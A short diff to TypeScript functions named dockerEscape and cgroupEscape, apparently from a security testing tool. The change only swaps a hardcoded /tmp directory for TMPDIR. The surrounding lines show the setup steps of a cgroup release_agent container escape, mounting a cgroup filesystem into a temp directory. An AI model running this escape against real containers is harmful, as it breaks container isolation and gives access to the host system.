@@ -342,7 +342,7 @@ async function dockerEscape(args: string[], timeout: number): Promise<HookResult
     output.push(`\n[+] Cgroup: ${inDocker ? "containerized" : "possibly host"}`)
     if (exploit && (!method || method === "cgroup")) {
       output.push(`[!] Attempting cgroup release_agent escape...`)
-      const d = "/tmp/cs-cgroup"
+      const d = `${process.env.TMPDIR || "/tmp"}/cs-cgroup`
       await run("mkdir", ["-p", d], 5)
       const mount = await run("mount", ["-t", "cgroup", "-o", "rdma", "cgroup", d], 10)
       if (mount.exitCode === 0)
@@ -1222,7 +1222,7 @@ async function cgroupEscape(args: string[], timeout: number): Promise<HookResult
 
   if (exploit) {
     output.push(`\n[!] Attempting cgroup release_agent escape...`)
-    const d = "/tmp/cs-cgroup-escape"
+    const d = `${process.env.TMPDIR || "/tmp"}/cs-cgroup-escape`
     await run("mkdir", ["-p", d], 3)
     const mount = await run("mount", ["-t", "cgroup", "-o", "rdma", "cgroup", d], 10)
     if (mount.exitCode === 0) {
